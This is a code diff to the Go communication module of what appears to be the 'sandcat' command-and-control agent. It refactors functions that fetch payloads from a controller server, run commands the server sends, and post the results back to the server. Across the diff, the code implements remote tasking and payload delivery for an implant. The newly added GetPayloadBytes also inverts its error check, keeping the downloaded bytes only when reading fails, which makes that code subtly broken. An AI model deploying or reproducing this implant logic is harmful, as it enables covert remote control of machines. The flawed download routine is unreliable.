@@ -7,7 +7,6 @@ import (
 	"io/ioutil"
 	"net/http"
 	"path/filepath"
-	"runtime"
 	"strings"
 
 	"../execute"
@@ -65,7 +64,7 @@ func (contact API) DropPayloads(profile map[string]interface{}, payload string) 
 	var droppedPayloads []string
 	for _, payload := range payloads {
 		if len(payload) > 0 {
-			droppedPayloads = append(droppedPayloads, contact.Drop(profile, payload))
+			droppedPayloads = append(droppedPayloads, contact.drop(payload, profile["server"].(string), profile["paw"].(string), profile["platform"].(string)))
 		}
 	}
 	return droppedPayloads
@@ -75,7 +74,7 @@ func (contact API) DropPayloads(profile map[string]interface{}, payload string) 
 func (contact API) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
     timeout := int(command["timeout"].(float64))
 	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
-	contact.SendExecutionResults(profile, command["id"], result, status, cmd, pid)
+	contact.SendExecutionResults(command["id"], profile["server"], result, status, cmd, pid, profile["paw"].(string))
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
@@ -85,15 +84,46 @@ func (contact API) C2RequirementsMet(profile map[string]interface{}, criteria in
 	return true
 }
 
+// Will obtain the payload bytes in memory to be written to disk later by caller.
+func (contact API) GetPayloadBytes(payload string, server string, uniqueID string, platform string) []byte {
+    var retBuf []byte
+    if len(payload) > 0 {
+		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload bytes: %s", payload))
+		address := fmt.Sprintf("%s/file/download", server)
+		req, _ := http.NewRequest("POST", address, nil)
+		req.Header.Set("file", payload)
+		req.Header.Set("platform", platform)
+		client := &http.Client{}
+		resp, err := client.Do(req)
+		if err == nil && resp.StatusCode == ok {
+			buf, err := ioutil.ReadAll(resp.Body)
+
+			if err != nil {
+			    retBuf = buf
+			}
+		}
+	}
+
+	return retBuf
+}
+
+//SendExecutionResults will send the execution results to the server.
+func (contact API) SendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string, pid string, uniqueID string) {
+	address := fmt.Sprintf("%s/results", server)
+	link := fmt.Sprintf("%s", commandID.(string))
+	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
+	request(address, data)
+}
+
 //Drop will download a single payload
-func (contact API) Drop(profile map[string]interface{}, payload string) string {
+func (contact API) drop(payload string, server string, uniqueID string, platform string) string {
 	location := filepath.Join(payload)
 	if len(payload) > 0 && util.Exists(location) == false {
 		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
-		address := fmt.Sprintf("%s/file/download", profile["server"].(string))
+		address := fmt.Sprintf("%s/file/download", server)
 		req, _ := http.NewRequest("POST", address, nil)
 		req.Header.Set("file", payload)
-		req.Header.Set("platform", string(runtime.GOOS))
+		req.Header.Set("platform", platform)
 		client := &http.Client{}
 		resp, err := client.Do(req)
 		if err == nil && resp.StatusCode == ok {
@@ -101,14 +131,6 @@ func (contact API) Drop(profile map[string]interface{}, payload string) string {
 		}
 	}
 	return location
-}
-
-//SendExecutionResults will send the execution results to the server.
-func (contact API) SendExecutionResults(profile map[string]interface{}, commandID interface{}, result []byte, status string, cmd string, pid string) {
-	address := fmt.Sprintf("%s/results", profile["server"].(string))
-	link := fmt.Sprintf("%s", commandID.(string))
-	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
-	request(address, data)
 }
 
 func request(address string, data []byte) []byte {
